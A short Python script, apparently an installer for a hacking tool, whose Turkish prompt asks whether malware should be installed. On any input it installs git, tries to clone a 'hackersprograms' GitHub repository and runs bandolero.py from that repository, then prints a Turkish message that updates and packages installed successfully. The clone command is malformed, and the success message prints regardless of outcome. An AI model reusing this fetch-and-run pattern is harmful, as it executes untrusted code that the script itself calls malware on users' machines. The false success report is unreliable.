import os
import sys
import colorama
from colorama import Fore
                     
def home():
    home = input((Fore.BLUE + "root@BandoLero" + Fore.WHITE + ":~# " + Fore.GREEN + "Zararlı yazılım yüklensinmi ?:"))
    if home:
        os.system("apt-get install git") #&& pkg install git
        os.system("git https://github.com/hackersprograms/hackersprograms.git")
        os.system("python3 /root/hackersprograms/bandolero.py")
       # os.system("rm hackersprograms")
        print((Fore.BLUE + "root@BandoLero" + Fore.WHITE + ":~# " + Fore.GREEN + "Güncellemeler ve ek paketler başarı ile yüklendi..."))

       
home()

